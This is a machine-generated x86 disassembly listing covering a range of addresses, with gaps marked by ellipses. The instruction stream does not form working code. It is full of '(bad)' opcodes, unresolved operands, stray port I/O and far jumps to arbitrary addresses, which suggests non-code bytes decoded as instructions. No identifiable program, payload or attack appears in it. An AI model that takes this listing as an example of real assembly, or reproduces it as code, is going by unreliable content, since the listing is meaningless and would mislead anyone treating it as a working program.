  426176:	and    BYTE PTR [esi-0xafa84a1],0x6f
  42617d:	or     al,al
  42617f:	jo     0x426177
  426181:	in     eax,dx
  426182:	pop    es
  426183:	jnp    0x4261d3
  426185:	pop    eax
  426186:	adc    BYTE PTR [eax+0x4a],cl
  426189:	adc    DWORD PTR [edi],0xf939aa90
  42618f:	push   0x0
	...
  4261f4:	fwait
  4261f5:	and    DWORD PTR [edi],ecx
  4261f7:	popa   
  4261f8:	mov    edi,0xb7fbff6f
  4261fd:	xor    DWORD PTR [ecx-0x19f43d9],0x44
  426204:	in     al,0x96
  426206:	add    DWORD PTR [eax],eax
  426208:	add    al,0x1
  42620a:	add    BYTE PTR [eax],al
  42620c:	push   ebp
  42620d:	lahf   
  42620e:	cli    
  42620f:	cmp    eax,0xf22b6e41
  426214:	fnstcw WORD PTR [esi-0x2e2ab357]
  42621a:	outs   dx,DWORD PTR ds:[esi]
  42621b:	pop    ebx
  42621c:	adc    al,0xe2
  42621e:	push   0x260955cc
  426223:	inc    edx
  426224:	fbstp  TBYTE PTR [edi-0x2d]
  426227:	pusha  
  426228:	int3   
  426229:	mov    edx,0xad49529d
  42622e:	push   es
  42622f:	add    ah,ah
  426231:	cdq    
  426232:	jecxz  0x42621a
  426234:	mov    ch,0x5a
  426236:	push   0xffffffb3
  426238:	mov    edx,0x4f00df35
  42623d:	jle    0x426276
  42623f:	outs   dx,DWORD PTR ds:[esi]
  426240:	dec    edx
  426241:	xor    ebp,DWORD PTR [eax-0x6c]
  426244:	or     eax,0x4b6b1fab
  426249:	sbb    ecx,esi
  42624b:	jo     0x4261ce
  42624d:	push   ebx
  42624e:	in     eax,dx
  42624f:	inc    edi
  426250:	dec    ebp
  426251:	cs dec edi
  426253:	and    BYTE PTR [edx],0x51
  426256:	xor    bl,BYTE PTR [ebx+0x6c1db142]
  42625c:	setae  dh
  42625f:	pop    ss
  426260:	hlt    
  426261:	out    0x4e,eax
  426263:	loopne 0x426284
  426265:	mov    dl,0x49
  426267:	popf   
  426268:	imul   edi,DWORD PTR [eax-0x58],0xb48de3cf
  42626f:	push   ecx
  426270:	pop    edi
  426271:	xor    DWORD PTR [edx+0x2b0b38d5],ecx
  426277:	lahf   
  426278:	pop    ss
  426279:	lock jp 0x4262f9
  42627c:	inc    ecx
  42627d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42627e:	push   ebp
  42627f:	dec    edi
  426280:	mov    dl,0x14
  426282:	(bad)  
  426283:	push   0xffffff81
  426285:	xchg   dl,cl
  426287:	dec    esi
  426288:	xlat   BYTE PTR ds:[ebx]
  426289:	daa    
  42628a:	xchg   dl,ch
  42628c:	inc    ecx
  42628d:	pop    edi
  42628e:	push   0x85a50e51
  426293:	jns    0x426237
  426295:	or     al,0x9d
  426297:	jle    0x426303
  426299:	push   eax
  42629a:	inc    ecx
  42629b:	or     eax,0x509c643d
  4262a0:	imul   esi,DWORD PTR [edi-0x8],0x6a5a2b20
  4262a7:	or     bh,BYTE PTR [ebp*2+0xe24f2d8]
  4262ae:	cld    
  4262af:	out    0xa9,eax
  4262b1:	mov    ?,edi
  4262b3:	sar    BYTE PTR [esi-0x61540e95],cl
  4262b9:	icebp  
  4262ba:	scas   al,BYTE PTR es:[edi]
  4262bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4262bc:	xchg   ebp,eax
  4262bd:	jecxz  0x42629f
  4262bf:	jo     0x4262ce
  4262c1:	ja     0x4262fe
  4262c3:	cli    
  4262c4:	adc    ebp,DWORD PTR [eax+esi*2+0x34]
  4262c8:	sub    ah,BYTE PTR [ecx-0x40a1cda3]
  4262ce:	mov    dl,0x20
  4262d0:	cmc    
  4262d1:	mov    bh,0xea
  4262d3:	in     eax,0xfb
  4262d5:	pusha  
  4262d6:	mov    dh,0xe7
  4262d8:	sub    al,0x1c
  4262da:	jl     0x426311
  4262dc:	int    0x42
  4262de:	shl    DWORD PTR [ebp-0x44],1
  4262e1:	dec    edi
  4262e2:	sub    al,0x29
  4262e4:	pop    esp
  4262e5:	xchg   BYTE PTR [esi+0xc78fdb7],cl
  4262eb:	dec    edi
  4262ec:	ficom  WORD PTR [ecx+0x17932af9]
  4262f2:	in     eax,0x35
  4262f4:	fbld   TBYTE PTR [ebp+0x6e4b6141]
  4262fa:	sub    eax,0xe315930e
  4262ff:	sub    eax,0xa1ce1d27
  426304:	shl    DWORD PTR [edi+0x1c1c156e],cl
  42630a:	and    BYTE PTR [ebx+0x5b7cb728],cl
	...
  426374:	push   esp
  426375:	and    eax,0xeefd4e8d
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0x648b1baa
  426384:	call   0x4426520
  426389:	add    DWORD PTR [eax],eax
  42638b:	add    bl,dh
  42638d:	(bad)  
  42638e:	aas    
  42638f:	jmp    0x96ba7aa0
  426394:	pop    ss
  426395:	sub    al,0x7d
  426397:	adc    al,0x58
  426399:	fmul   QWORD PTR [edi]
  42639b:	imul   BYTE PTR [edi]
  42639d:	inc    ebp
  42639e:	mov    ah,0xdc
  4263a0:	(bad)  [esi+0x4efa5dfd]
  4263a6:	dec    esp
  4263a7:	jp     0x426360
  4263a9:	or     bh,BYTE PTR [eax-0x31]
  4263ac:	cmp    dh,BYTE PTR [edi]
  4263ae:	fsub   st,st(4)
  4263b0:	mov    ds:0xb67b7f7e,eax
  4263b5:	retf   0x1908
  4263b8:	retf   0xdd68
  4263bb:	sub    esp,edx
  4263bd:	sub    DWORD PTR ds:0x75942fb4,ecx
  4263c3:	dec    ecx
  4263c4:	dec    esi
  4263c5:	cld    
  4263c6:	xchg   esp,eax
  4263c7:	or     ebp,esp
  4263c9:	cdq    
  4263ca:	sbb    DWORD PTR [eax+ecx*4],esp
  4263cd:	loopne 0x4263ac
  4263cf:	test   DWORD PTR [eax+0x49],ecx
  4263d2:	(bad)  
  4263d3:	mov    DWORD PTR [edi],edx
  4263d5:	stc    
  4263d6:	sbb    BYTE PTR [edi-0x36d90ec1],ah
  4263dc:	imul   ebx,ebx,0x3753c04c
  4263e2:	push   esp
  4263e3:	std    
  4263e4:	sti    
  4263e5:	xlat   BYTE PTR ds:[ebx]
  4263e6:	pop    ebp
  4263e7:	imul   DWORD PTR [ebx]
  4263e9:	js     0x4263eb
  4263eb:	cmp    eax,0xc122361e
  4263f0:	ja     0x426459
  4263f2:	mov    edx,0x6e3a52dd
  4263f7:	jp     0x426442
  4263f9:	sbb    BYTE PTR [eax],dh
  4263fb:	repnz inc edx
  4263fd:	(bad)  
  4263fe:	cmp    eax,0x304598ba
  426403:	mov    ebp,cs
  426405:	inc    edx
  426406:	push   ebx
  426407:	dec    eax
  426408:	cmp    al,bl
  42640a:	fwait
  42640b:	cmp    eax,ecx
  42640d:	push   0xade8b0e9
  426412:	sbb    DWORD PTR [eax+0x6dbc6335],0x39
  426419:	mov    ds:0xeccc9986,eax
  42641e:	and    BYTE PTR [edi],ah
  426420:	xor    al,BYTE PTR [eax+0x31]
  426423:	adc    cl,ah
  426425:	mov    dl,0x76
  426427:	lods   al,BYTE PTR ds:[esi]
  426428:	or     DWORD PTR [esi-0x26],edx
  42642b:	jl     0x426469
  42642d:	cwde   
  42642e:	mov    esp,0x99c2f394
  426433:	sub    BYTE PTR [edx+edx*4+0x699a3256],al
  42643a:	xor    cl,BYTE PTR [eax]
  42643c:	cdq    
  42643d:	adc    BYTE PTR [eax-0x67],0xea
  426441:	xor    ah,al
  426443:	retf   0x5031
  426446:	mov    bl,0xbc
  426448:	ja     0x4263ce
  42644a:	int3   
  42644b:	in     al,0xd7
  42644d:	mov    ecx,DWORD PTR [eax+0x21fa076d]
  426453:	sub    DWORD PTR [edi+0x515d190],eax
  426459:	push   0xfd8ff1b9
  42645e:	enter  0xf70f,0x52
  426462:	scas   eax,DWORD PTR es:[edi]
  426463:	inc    esp
  426464:	mov    ?,WORD PTR [esi-0x23ec8c3b]
  42646a:	cmp    DWORD PTR [ebp+esi*2+0xd],0x47eb9bea
  426472:	xor    DWORD PTR [ecx+ebp*4-0x61],eax
  426476:	mov    ?,edi
  426478:	das    
  426479:	adc    edi,DWORD PTR [ecx]
  42647b:	lods   eax,DWORD PTR ds:[esi]
  42647c:	jle    0x426497
  42647e:	pop    eax
  42647f:	mov    esi,0x47dd9f34
  426484:	sar    BYTE PTR [ebx-0x5bdae925],0x6b
  42648b:	and    al,al
  42648d:	ror    BYTE PTR ds:0x3f,0x0
	...
  4264f4:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  4264fb:	outs   dx,DWORD PTR ds:[esi]
  4264fc:	vmwrite ecx,DWORD PTR [edx+0xb430885]
  426503:	or     al,0xec
  426505:	cwde   
  426506:	add    DWORD PTR [eax],eax
  426508:	add    al,0x1
  42650a:	add    BYTE PTR [eax],al
  42650c:	js     0x426510
  42650e:	cmp    al,BYTE PTR [ecx-0x2b]
  426511:	cs or  al,BYTE PTR cs:[edx-0x3e]
  426516:	adc    BYTE PTR [eax+0x30c0eb1a],cl
  42651c:	gs pop ebx
  42651e:	ss pop edx
  426520:	repnz test eax,0xf5d4dd25
  426526:	cmp    ah,BYTE PTR [ecx+0x21ffd571]
  42652c:	sub    BYTE PTR [edx-0x23],ch
  42652f:	inc    esi
  426530:	dec    ebp
  426531:	mov    ch,BYTE PTR ds:0xdc480347
  426537:	jle    0x42656d
  426539:	push   edx
  42653a:	shl    BYTE PTR [esi-0x5e260357],0xb0
  426541:	adc    al,0xe0
  426543:	rol    BYTE PTR ss:[esi-0x5930b972],0x85
  42654b:	adc    edx,DWORD PTR [ecx]
  42654d:	add    DWORD PTR [ebp-0x27],ebp
  426550:	outs   dx,DWORD PTR ds:[esi]
  426551:	and    eax,0x3d0762c5
  426556:	test   DWORD PTR [edx-0x53],0x3a282db9
  42655d:	xchg   esp,eax
  42655e:	xchg   ebp,eax
  42655f:	cmp    al,0xc4
  426561:	ins    BYTE PTR es:[edi],dx
  426562:	pop    eax
  426563:	jge    0x4265b5
  426565:	loope  0x4265c4
  426567:	retf   0x76e6
  42656a:	xchg   esp,eax
  42656b:	mov    bl,0xc7
  42656e:	outs   dx,BYTE PTR ds:[esi]
  42656f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426570:	cmp    esi,ebp
  426572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426573:	jns    0x4265d5
  426575:	pop    ebp
  426576:	push   ebx
  426577:	sub    dh,BYTE PTR [edx+0x71a574c7]
  42657d:	inc    ebp
  42657e:	jmp    0x41c2:0xac95ad7d
  426585:	jg     0x426529
  426587:	mov    edi,0x933d4574
  42658c:	xchg   edi,eax
  42658d:	mov    ebp,0x1cbb0a09
  426592:	mov    esi,eax
  426594:	pop    ss
  426595:	sahf   
  426596:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426598:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426599:	inc    ecx
  42659a:	daa    
  42659b:	into   
  42659c:	or     ch,BYTE PTR ds:0xf03bb94e
  4265a2:	xor    al,0xa9
  4265a4:	jne    0x4265f4
  4265a6:	push   ss
  4265a7:	mov    bl,0x2c
  4265a9:	stc    
  4265aa:	cmp    BYTE PTR [ecx+0x55],ah
  4265ad:	ja     0x42658a
  4265af:	(bad)  
  4265b0:	jmp    0x42656a
  4265b2:	jle    0x426626
  4265b4:	mov    al,ds:0x583a9f94
  4265b9:	xlat   BYTE PTR ds:[ebx]
  4265ba:	ror    BYTE PTR [edi+0x30],cl
  4265bd:	dec    ebx
  4265be:	(bad)  
  4265bf:	call   0xa7ce0a71
  4265c4:	xor    BYTE PTR [ecx],ah
  4265c6:	jae    0x426588
  4265c8:	mov    edx,0x578d6b5d
  4265cd:	jo     0x4265a6
  4265cf:	mov    al,ds:0xca5adae2
  4265d4:	stos   BYTE PTR es:[edi],al
  4265d5:	xchg   ebx,eax
  4265d6:	sub    eax,0xe8b65c12
  4265db:	push   ebx
  4265dc:	xchg   ebp,eax
  4265dd:	jge    0x426575
  4265df:	jmp    0x4265d5
  4265e1:	adc    eax,0x5dd809c3
  4265e6:	imul   eax,DWORD PTR [edi+edi*4],0x27
  4265ea:	enter  0xc821,0x4
  4265ee:	dec    esp
  4265ef:	cld    
  4265f0:	mov    ah,0x43
  4265f2:	dec    esi
  4265f3:	jp     0x4265ae
  4265f5:	mov    cl,ch
  4265f7:	adc    BYTE PTR [ecx+0x1c],ah
  4265fa:	lahf   
  4265fb:	(bad)  
  4265fc:	fstp   QWORD PTR [eax]
  4265fe:	ds adc eax,0x990e68d0
  426604:	pushf  
  426605:	repnz out dx,eax
  426607:	addr16 mov al,ds:0xee94
  42660b:	arpl   WORD PTR [eax+edx*1],bp
  42660e:	sbb    DWORD PTR cs:[eax],eax
	...
  426671:	add    BYTE PTR [eax],al
  426673:	add    BYTE PTR [edx],dl
  426675:	retf   
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi-0x247925c]
  426682:	pushf  
  426683:	pop    edx
  426684:	lock cdq 
  426686:	add    DWORD PTR [eax],eax
  426688:	add    al,0x1
  42668a:	add    BYTE PTR [eax],al
  42668c:	in     al,dx
  42668d:	mov    ecx,DWORD PTR [ecx+edi*8-0x2f]
  426691:	imul   ebx,eax,0x61bf1878
  426697:	aas    
  426698:	(bad)  
  426699:	cmp    ebx,DWORD PTR [esi+0x36]
  42669c:	inc    esi
  42669d:	sbb    dh,BYTE PTR [ecx-0x6606012c]
  4266a3:	adc    bl,BYTE PTR ds:0xd313ea3e
  4266a9:	mov    es,WORD PTR [eax+0x402072e4]
  4266af:	mov    WORD PTR [edx-0x63f99f37],cs
  4266b5:	ret    
  4266b6:	cwde   
  4266b7:	inc    esi
  4266b8:	xor    BYTE PTR [eax-0x63797040],dh
  4266be:	inc    edx
  4266bf:	jge    0x42673b
  4266c1:	pop    ebx
  4266c2:	xchg   ecx,eax
  4266c3:	imul   ebp,eax,0xaf94558
  4266c9:	in     eax,0x67
  4266cb:	repnz sar BYTE PTR [ecx+ecx*8+0x51],1
  4266d0:	repnz gs xchg ebp,eax
  4266d3:	pop    ss
  4266d4:	jmp    0xa91:0x3abd9871
  4266db:	adc    DWORD PTR [edx],0xa09863c8
  4266e1:	push   cs
  4266e2:	jmp    0xdc73:0x5500c107
  4266e9:	sbb    esp,DWORD PTR es:[ebx]
  4266ec:	lea    esp,[ebx-0x2]
  4266ef:	fwait
  4266f0:	inc    eax
  4266f1:	fs sti 
  4266f3:	out    dx,eax
  4266f4:	inc    eax
  4266f5:	jmp    0x426757
  4266f7:	jbe    0x42673d
  4266f9:	fwait
  4266fa:	mov    edx,DWORD PTR [ebp+0x4582b15c]
  426700:	sbb    al,0xbd
  426702:	inc    esp
  426703:	(bad)  
  426704:	mov    dl,0xfb
  426706:	fisttp QWORD PTR [esi-0x2cb18644]
  42670c:	sub    al,BYTE PTR [edx]
  42670e:	bound  ebx,QWORD PTR [esi]
  426710:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426711:	arpl   WORD PTR [ebx-0x63b31d8b],dx
  426717:	mov    ecx,0x97d944b7
  42671c:	jge    0x4266a0
  42671e:	das    
  42671f:	jl     0x42676e
  426721:	loope  0x426762
  426723:	cmp    al,0x4c
  426725:	ucomiss xmm0,DWORD PTR [ebx-0x1e16b2e2]
  42672c:	adc    DWORD PTR [esi],0xffffff98
  42672f:	mov    esi,0xed440d94
  426734:	dec    edx
  426735:	jnp    0x426739
  426737:	je     0x4266fa
  426739:	xchg   edx,eax
  42673a:	cs aaa 
  42673c:	fdivrp st(0),st
  42673e:	iret   
  42673f:	and    DWORD PTR [ecx-0x35f50fab],edx
  426745:	sub    DWORD PTR [eax+0x1],esi
  426748:	inc    ebp
  426749:	shr    bl,1
  42674b:	mov    ch,0x55
  42674d:	ds mov ebx,0x6b8944bd
  426753:	jo     0x4267b9
  426755:	stos   BYTE PTR es:[edi],al
  426756:	fsubr  st,st(3)
  426758:	cmp    dl,dl
  42675a:	pushf  
  42675b:	adc    BYTE PTR ds:0xc88ec0bc,ah
  426761:	pop    esp
  426762:	shr    esp,0xd7
  426765:	into   
  426766:	and    cl,ch
  426768:	add    eax,ebp
  42676a:	arpl   WORD PTR [ebp+0x7e],ax
  42676d:	jae    0x426733
  42676f:	mov    eax,ds:0xdacc81d8
  426774:	jo     0x4267a0
  426776:	add    DWORD PTR [edi+ebp*2],0xffffffa3
  42677a:	rcr    DWORD PTR [esi+0x6367c35d],cl
  426780:	or     al,0xf3
  426782:	push   ds
  426783:	xchg   ebp,eax
  426784:	dec    edx
  426785:	jmp    0xc34d:0xe22f84a8
  42678c:	call   0x0:0x16f03d
	...
  4267f3:	add    BYTE PTR [eax-0xd53173],bh
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	xor    BYTE PTR [ebx],cl
  426802:	sub    al,0x6a
  426804:	hlt    
  426805:	call   0x0:0x1040001
  42680c:	pop    ds
  42680d:	push   es
  42680e:	xor    ch,bh
  426810:	les    edi,FWORD PTR [ebp+0x661af054]
  426816:	(bad)  
  426817:	sbb    eax,0x6b9e1c60
  42681c:	dec    edi
  42681d:	into   
  42681e:	inc    esp
  42681f:	jbe    0x42682d
  426821:	bound  esp,QWORD PTR [eax-0x72]
  426824:	mov    edx,0x52cdd226
  426829:	lahf   
  42682a:	pop    ecx
  42682b:	add    DWORD PTR [edx-0x25e0e220],eax
  426831:	push   esp
  426832:	cmp    eax,0x57110a80
  426837:	dec    ebp
  426838:	push   esi
  426839:	adc    al,0xcd
  42683b:	(bad)  
  42683c:	out    dx,eax
  42683d:	stos   DWORD PTR es:[edi],eax
  42683e:	icebp  
  42683f:	adc    BYTE PTR [ebx-0xf],bl
  426842:	push   ecx
  426843:	or     al,0x17
  426845:	aad    0x8f
  426847:	ins    BYTE PTR es:[edi],dx
  426848:	retf   0x42bb
  42684b:	pop    ebx
  42684c:	mov    cl,0x36
  42684e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42684f:	or     BYTE PTR [ecx],dl
  426851:	lds    eax,FWORD PTR [ebx+eax*8+0x23861e46]
  426858:	add    DWORD PTR [edi+edi*2-0x7ca287b0],esp
  42685f:	cmp    al,0xa7
  426861:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  426863:	xchg   ebp,eax
  426864:	mov    eax,DWORD PTR [ecx+0x2c]
  426867:	ja     0x42688c
  426869:	mov    WORD PTR [eax+edi*1+0x7e2aea30],ss
  426870:	or     eax,0x3ffbcc72
  426875:	lods   al,BYTE PTR ds:[esi]
  426876:	shl    DWORD PTR [edx+0x7e],cl
  426879:	in     eax,0xbe
  42687b:	xchg   edi,eax
  42687c:	inc    ecx
  42687d:	adc    eax,eax
  42687f:	in     al,0x5a
  426881:	and    ebp,ecx
  426883:	xor    edi,DWORD PTR ds:0xaca342b5
  426889:	mov    al,ds:0x3068cc72
  42688e:	xchg   ecx,eax
  42688f:	add    eax,0x9be9bed8
  426894:	in     eax,0x38
  426896:	adc    al,0x88
  426898:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426899:	fdiv   DWORD PTR [esi+eiz*2+0x2a]
  42689d:	stc    
  42689e:	add    al,0x5a
  4268a0:	or     bh,bh
  4268a2:	lea    esp,[edx]
  4268a4:	mov    ebx,0x94550da0
  4268a9:	dec    ebp
  4268aa:	repnz dec esp
  4268ac:	or     al,0x91
  4268ae:	fadd   st,st(7)
  4268b0:	retf   0x76a7
  4268b3:	or     edi,0x40
  4268b6:	or     eax,0x68df865b
  4268bb:	inc    ecx
  4268bc:	and    ah,bl
  4268be:	iret   
  4268bf:	pop    ss
  4268c0:	add    bl,BYTE PTR [ebx-0x6f3a7fe3]
  4268c6:	or     esi,DWORD PTR [ebp-0x25686411]
  4268cc:	cld    
  4268cd:	loopne 0x426949
  4268cf:	cmp    BYTE PTR ds:0x14668e83,bl
  4268d5:	test   BYTE PTR [esi],dl
  4268d7:	adc    DWORD PTR [ebx+eiz*1-0x73],0xffffffd3
  4268dc:	pusha  
  4268dd:	jmp    0x2b6b7b53
  4268e2:	js     0x42693f
  4268e4:	mov    esi,0xa3b49f4d
  4268e9:	or     DWORD PTR [eax-0x61d46946],0x43
  4268f0:	test   al,0x5
  4268f2:	imul   esp,esp,0xffffff87
  4268f5:	xchg   ecx,eax
  4268f6:	cwde   
  4268f7:	sub    al,BYTE PTR [edi]
  4268f9:	scas   eax,DWORD PTR es:[edi]
  4268fa:	xchg   edi,eax
  4268fb:	xor    esp,esp
  4268fd:	arpl   WORD PTR [ebp+0x1c],dx
  426900:	dec    ebx
  426901:	mov    esp,0x89aa9203
  426906:	fst    DWORD PTR [edx]
  426908:	push   ebx
  426909:	ds aaa 
  42690b:	imul   ebx,DWORD PTR [edx+0x9cf23a],0x0
	...
  426972:	add    BYTE PTR [eax],al
  426974:	mov    WORD PTR [esi+0x7d],cs
  426977:	jge    0x426978
  426979:	jg     0x426907
  42697b:	jmp    FWORD PTR [ebx]
  42697d:	in     al,dx
  42697e:	lahf   
  42697f:	mov    edi,DWORD PTR [edx]
  426981:	test   edi,ebx
  426983:	dec    ecx
  426984:	clc    
  426985:	fwait
  426986:	add    DWORD PTR [eax],eax
  426988:	add    al,0x1
  42698a:	add    BYTE PTR [eax],al
  42698c:	cs mov bh,0x3c
  42698f:	add    eax,0xff96bcbc
  426994:	xchg   esp,ebx
  426996:	pop    es
  426997:	mov    edi,0x384c8ec6
  42699c:	ffree  st(2)
  42699e:	pop    esi
  42699f:	in     al,0xfc
  4269a1:	xor    DWORD PTR [ebp-0x5b],ebx
  4269a4:	mov    DWORD PTR [esi],edi
  4269a6:	sub    BYTE PTR [edx-0x5f24cb46],ah
  4269ac:	cwde   
  4269ad:	mov    ebx,0x293a591e
  4269b2:	pop    esp
  4269b3:	shl    ah,cl
  4269b5:	mov    BYTE PTR [edi+0x29],dh
  4269b8:	xchg   ebx,ecx
  4269ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269bb:	jns    0x426990
  4269bd:	dec    ebx
  4269be:	push   0xc8e31afe
  4269c3:	retf   0xdb34
  4269c6:	fist   DWORD PTR [edx+0x70]
  4269c9:	cli    
  4269ca:	pop    es
  4269cb:	ins    DWORD PTR es:[edi],dx
  4269cc:	data16 jb 0x4269e3
  4269cf:	aad    0x9c
  4269d1:	xor    al,BYTE PTR [edi+0x30]
  4269d4:	push   0x2a
  4269d6:	das    
  4269d7:	mov    ecx,0x7829be8f
  4269dc:	repnz mov al,es:0x23ee2280
  4269e3:	pop    ebx
  4269e4:	scas   al,BYTE PTR es:[edi]
  4269e5:	repz retf 
  4269e7:	pop    ebx
  4269e8:	and    al,0x6
  4269ea:	fld    st(5)
  4269ec:	lods   al,BYTE PTR ds:[esi]
  4269ed:	cmp    ecx,DWORD PTR gs:[edi]
  4269f0:	out    0x28,al
  4269f2:	dec    ebx
  4269f3:	xor    DWORD PTR [esi-0x7d],esi
  4269f6:	jns    0x426a45
  4269f8:	inc    ebx
  4269f9:	inc    ecx
  4269fa:	cmp    al,0x3d
  4269fc:	rcr    BYTE PTR [edx+0xc5f74df],cl
  426a02:	hlt    
  426a03:	les    ebx,FWORD PTR [edx-0x17c4a12e]
  426a09:	mov    ecx,0x1014d101
  426a0e:	cmp    eax,0x3b356596
  426a13:	call   0xebf11362
  426a18:	pop    edi
  426a19:	mov    ds:0x1ce7900d,eax
  426a1e:	and    al,0xfb
  426a20:	ds add eax,0x7a9ecb25
  426a26:	aam    0xd6
  426a28:	pop    es
  426a29:	stos   BYTE PTR es:[edi],al
  426a2a:	jbe    0x426a40
  426a2c:	xor    DWORD PTR [ecx-0x40011813],esi
  426a32:	jg     0x426ab0
  426a34:	fadd   QWORD PTR [eax+edi*2-0x74]
  426a38:	(bad)  
  426a39:	lods   eax,DWORD PTR ds:[esi]
  426a3a:	ja     0x4269e5
  426a3c:	push   ds
  426a3d:	lods   eax,DWORD PTR ds:[esi]
  426a3e:	(bad)  
  426a3f:	sbb    DWORD PTR [esi+esi*4],esp
  426a42:	xor    al,0xb5
  426a44:	das    
  426a45:	scas   al,BYTE PTR es:[edi]
  426a46:	pusha  
  426a47:	adc    dh,BYTE PTR [ebx+0x7]
  426a4a:	js     0x4269e6
  426a4c:	inc    eax
  426a4d:	xchg   ebp,eax
  426a4e:	xchg   ebp,eax
  426a4f:	adc    edi,DWORD PTR [eax+ebx*1]
  426a52:	(bad)  [edx+0x4a]
  426a55:	add    al,0xb0
  426a57:	nop
  426a58:	or     DWORD PTR [ecx],eax
  426a5a:	jl     0x426a4a
  426a5c:	rol    BYTE PTR [edi-0x358bb919],cl
  426a62:	jbe    0x426aaa
  426a64:	sub    DWORD PTR [ebx+0x569fa816],ebx
  426a6a:	outs   dx,DWORD PTR ds:[esi]
  426a6b:	mov    BYTE PTR [ebx-0x22],dh
  426a6e:	stos   DWORD PTR es:[edi],eax
  426a6f:	popa   
  426a70:	std    
  426a71:	inc    esi
  426a72:	rol    BYTE PTR [edx],0x1a
  426a75:	mov    al,0x83
  426a77:	adc    BYTE PTR [ecx-0x63],cl
  426a7a:	mov    eax,0xa4474108
  426a7f:	dec    esp
  426a80:	mov    ebp,0xe2421e61
  426a85:	push   ss
  426a86:	sbb    al,0x36
  426a88:	ss repz add eax,0xb70fcdd1
  426a8f:	jp     0x426a91
	...
  426af1:	add    BYTE PTR [eax],al
  426af3:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  426af9:	ja     0x426ad6
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0x73
  426b01:	adc    BYTE PTR [ebx+0x19cfc2b],ch
  426b07:	add    BYTE PTR [ecx+eax*1],al
  426b0a:	add    BYTE PTR [eax],al
  426b0c:	out    dx,al
  426b0d:	(bad)  
  426b0f:	popf   
  426b10:	push   edi
  426b11:	repnz xor esi,DWORD PTR cs:0xdaa12553
  426b19:	retf   0x4d72
  426b1c:	pop    ecx
  426b1d:	into   
  426b1e:	mov    ds:0xa3274c7c,al
  426b23:	cmc    
  426b24:	sahf   
  426b25:	cmp    DWORD PTR [ebp-0x4d],0x94b77d1d
  426b2c:	into   
  426b2d:	int3   
  426b2e:	or     ch,BYTE PTR [ecx+0x1e]
  426b31:	(bad)
  426b34:	test   ebx,ebp
  426b36:	xchg   edx,eax
  426b37:	dec    ebx
  426b38:	inc    ebx
  426b39:	sbb    eax,0x6bf12bcc
  426b3e:	shl    BYTE PTR [edx],cl
  426b40:	mov    WORD PTR [edi],fs
  426b42:	mov    esp,0x1e66ee38
  426b47:	enter  0xf483,0x29
  426b4b:	dec    ecx
  426b4c:	das    
  426b4d:	or     DWORD PTR [ebp-0x1fab44d3],eax
  426b53:	xchg   ecx,eax
  426b54:	rcr    BYTE PTR [edi-0x681f7565],0x7e
  426b5b:	jmp    0xf3b943f5
  426b60:	xor    BYTE PTR [eax+eiz*8-0x36],bl
  426b64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426b66:	mov    cl,0x47
  426b68:	pop    ecx
  426b69:	mov    esi,0xc3341fcc
  426b6e:	les    esp,FWORD PTR [esi]
  426b70:	out    0xf,eax
  426b72:	mov    BYTE PTR [esi+0x5892507d],0x87
  426b79:	jno    0x426b9d
  426b7b:	in     eax,0x26
  426b7d:	fxch   st(0)
  426b7f:	push   edx
  426b80:	rol    DWORD PTR [ebp+0x59],cl
  426b83:	pop    ebp
  426b84:	mov    bh,0x3e
  426b86:	mov    eax,0xd11d88b6
  426b8b:	(bad)  
  426b8c:	scas   al,BYTE PTR es:[edi]
  426b8d:	jmp    DWORD PTR [ebx-0x16]
  426b90:	jg     0x426b2c
  426b92:	(bad)  
  426b94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b95:	sbb    al,0x6c
  426b97:	jo     0x426bc8
  426b99:	and    BYTE PTR [edx-0x15105c72],0x5b
  426ba0:	(bad)  
  426ba1:	sub    al,0x59
  426ba3:	pop    esi
  426ba4:	mov    BYTE PTR [eax+0x54],bl
  426ba7:	cmp    al,0xbd
  426ba9:	jg     0x426bb7
  426bab:	xchg   BYTE PTR ds:0x89c11180,ch
  426bb1:	sub    eax,DWORD PTR [edi+0x2e]
  426bb4:	push   cs
  426bb5:	cdq    
  426bb6:	out    dx,al
  426bb7:	sbb    BYTE PTR [edi-0x6c],0xdf
  426bbb:	outs   dx,BYTE PTR ds:[esi]
  426bbc:	lock and BYTE PTR [esi+0x5a],ch
  426bc0:	dec    ecx
  426bc1:	xor    eax,0xa48f357d
  426bc6:	sbb    al,0xa0
  426bc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426bc9:	add    al,0xa2
  426bcb:	push   es
  426bcc:	mov    edx,0xb42df37e
  426bd1:	pusha  
  426bd2:	retf   0xb825
  426bd5:	in     eax,0x41
  426bd7:	mov    edx,DWORD PTR [edx]
  426bd9:	stc    
  426bda:	and    esp,DWORD PTR [ebp+0x35]
  426bdd:	call   0x5ca48fb1
  426be2:	dec    edi
  426be3:	push   esp
  426be4:	cmc    
  426be5:	daa    
  426be6:	xchg   ebx,eax
  426be7:	sub    DWORD PTR [eax+0x68],edx
  426bea:	sbb    dh,BYTE PTR ds:0x63867e1e
  426bf0:	ins    DWORD PTR es:[edi],dx
  426bf1:	adc    al,0x75
  426bf3:	(bad)  
  426bf4:	lock test BYTE PTR [esi],bl
  426bf7:	push   esp
